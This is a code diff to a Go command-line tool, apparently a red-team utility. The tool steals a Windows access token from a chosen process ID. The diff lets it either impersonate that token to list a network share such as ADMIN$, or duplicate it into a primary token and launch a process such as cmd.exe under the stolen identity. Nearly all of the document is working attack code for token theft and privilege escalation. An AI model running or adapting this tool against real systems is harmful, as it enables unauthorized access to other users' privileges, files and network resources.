@@ -5,6 +5,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"log"
 	privs "oddments/pkg/privs"
 	"oddments/windows/process"
@@ -21,6 +22,10 @@ func main() {
 	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output")
 	flag.BoolVar(&debug, "debug", false, "Enable debug output")
 	pid := flag.Uint("pid", 0, "The process ID to steal a token from")
+	create := flag.Bool("create", false, "Create a new process with stolen token")
+	proc := flag.String("process", "cmd.exe", "The process to run as the provided user")
+	args := flag.String("args", "/k whoami /all", "Arguments to run the process with")
+	path := flag.String("path", "\\\\127.0.0.1\\ADMIN$", "A network file share UNC path to retrieve the contents of with the stolen token")
 	flag.Usage = func() {
 		flag.PrintDefaults()
 		os.Exit(0)
@@ -28,6 +33,16 @@ func main() {
 	flag.Parse()
 
 	if *pid == 0 {
+		flag.Usage()
+	}
+
+	if *create && *proc == "" {
+		fmt.Println("A value must be provided with the -process argument")
+		flag.Usage()
+	}
+
+	if !*create && *path == "" {
+		fmt.Println("A value must be provided with the -path argument")
 		flag.Usage()
 	}
 
@@ -103,73 +118,110 @@ func main() {
 	}()
 
 	// Apply the token to this process
-	if debug {
-		fmt.Println("[DEBUG] Calling tokens.ImpersonateLoggedOnUserN...")
-	}
-	err = tokens.ImpersonateLoggedOnUserN(token)
-	if err != nil {
-		log.Fatal(err)
-	}
-	if verbose {
-		fmt.Println("[-] Successfully applied the stolen token")
-	}
+	if !*create {
+		if debug {
+			fmt.Println("[DEBUG] Calling tokens.ImpersonateLoggedOnUserN...")
+		}
+		err = tokens.ImpersonateLoggedOnUserN(token)
+		if err != nil {
+			log.Fatal(err)
+		}
+		if verbose {
+			fmt.Println("[-] Successfully applied the stolen token")
+		}
+		fmt.Printf("[+] Successfully stole token from PID %d and applied it to this process\n", *pid)
 
-	// Display token information
-	if debug {
-		fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
-	}
-	whoami, err = tokens.WhoamiG()
-	if err != nil {
-		log.Fatal(err)
-	}
-	if verbose {
-		fmt.Printf("[-] Token WhoAmI:\n%s\n", whoami)
-	}
+		// Insert native Go code here you want to use the thread impersonation token
 
-	// List stolen access token privileges
-	if debug {
-		fmt.Println("[DEBUG] Getting the current (calling) process access token privileges...")
-		parentPrivs, err := privs.GetPrivileges(process.GetCurrentProcessTokenN())
+		// Use the stolen token to list the contents of a remote file share
+		// This should be a resource that the process token can't access, but the threat token can
+		if debug {
+			fmt.Printf("[DEBUG] Using stolen token to remotely list the contents of %s...\n", *path)
+		}
+		files, err := ioutil.ReadDir(*path)
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Printf("\nDirectory listing for %s\n\n", *path)
+		for _, file := range files {
+			fmt.Printf("%s\t%d\t%s\n", file.Mode(), file.Size(), file.Name())
+		}
+		fmt.Println()
+
+		// Display token information
+		if debug {
+			fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
+		}
+		whoami, err = tokens.WhoamiG()
+		if err != nil {
+			log.Fatal(err)
+		}
+		if verbose {
+			fmt.Printf("[-] Token WhoAmI:\n%s\n", whoami)
+		}
+
+		// List stolen access token privileges
+		if debug {
+			fmt.Println("[DEBUG] Getting the current (calling) process access token privileges...")
+			parentPrivs, err := privs.GetPrivileges(process.GetCurrentProcessTokenN())
+			if err != nil {
+				fmt.Printf("[!] %s\n", err)
+			}
+			fmt.Println("[-] Current (calling) process access token privileges:")
+			for _, p := range parentPrivs {
+				fmt.Printf("\t%s\n", p)
+			}
+
+			fmt.Println("[DEBUG] Getting stolen access token privileges...")
+			privileges, err := privs.GetPrivileges(token)
+			if err != nil {
+				fmt.Printf("[!] %s\n", err)
+			}
+			fmt.Println("[-] Stolen access token privileges:")
+			for _, p := range privileges {
+				fmt.Printf("\t%s\n", p)
+			}
+		}
+
+		// Revert to self - Drop the stolen token
+		if debug {
+			fmt.Println("[DEBUG] Calling tokens.RevertTotSelfN()...")
+		}
+		err = tokens.RevertToSelfN()
 		if err != nil {
 			fmt.Printf("[!] %s\n", err)
 		}
-		fmt.Println("[-] Current (calling) process access token privileges:")
-		for _, p := range parentPrivs {
-			fmt.Printf("\t%s\n", p)
+		if verbose {
+			fmt.Println("[-] Successfully reverted to self and dropped the stolen token")
 		}
+	}
 
-		fmt.Println("[DEBUG] Getting stolen access token privileges...")
-		privileges, err := privs.GetPrivileges(token)
+	// Create a new process with the stolen token
+	if *create {
+		// Convert stolen impersonation token into a primary token
+		if debug {
+			fmt.Println("[DEBUG] Calling tokens.DuplicateTokenN...")
+		}
+		var MAXIMUM_ALLOWED uint32 = 0x02000000
+		var SecurityImpersonation uint32 = 0x2
+		var TokenPrimary uint32 = 0x1
+		dupToken, err := tokens.DuplicateTokenN(token, MAXIMUM_ALLOWED, SecurityImpersonation, TokenPrimary)
 		if err != nil {
-			fmt.Printf("[!] %s\n", err)
+			log.Fatal(err)
 		}
-		fmt.Println("[-] Stolen access token privileges:")
-		for _, p := range privileges {
-			fmt.Printf("\t%s\n", p)
+		if verbose {
+			fmt.Printf("[+] Successfully duplicated the stolen token: %v\n", dupToken)
 		}
-	}
 
-	// Create a process with the token
-	if debug {
-		fmt.Println("[DEBUG] Calling tokens.CreateProcessWithTokenN...")
-	}
-	err = tokens.CreateProcessWithTokenN(token, "cmd.exe", "")
-	if err != nil {
-		log.Fatal(err)
-	}
-	if verbose {
-		fmt.Println("[+] Successfully created a process with the stolen token")
-	}
+		// Create a process with the token
+		if debug {
+			fmt.Println("[DEBUG] Calling tokens.CreateProcessWithTokenN...")
+		}
+		err = tokens.CreateProcessWithTokenN(dupToken, *proc, *args)
+		if err != nil {
+			log.Fatal(err)
+		}
 
-	// Revert to self - Drop the stolen token
-	if debug {
-		fmt.Println("[DEBUG] Calling tokens.RevertTotSelfN()...")
-	}
-	err = tokens.RevertToSelfN()
-	if err != nil {
-		fmt.Printf("[!] %s\n", err)
-	}
-	if verbose {
-		fmt.Println("[-] Successfully reverted to self and dropped the stolen token")
+		fmt.Printf("[+] Successfully created the %s process with the stolen token from PID %d\n", *proc, *pid)
 	}
 }
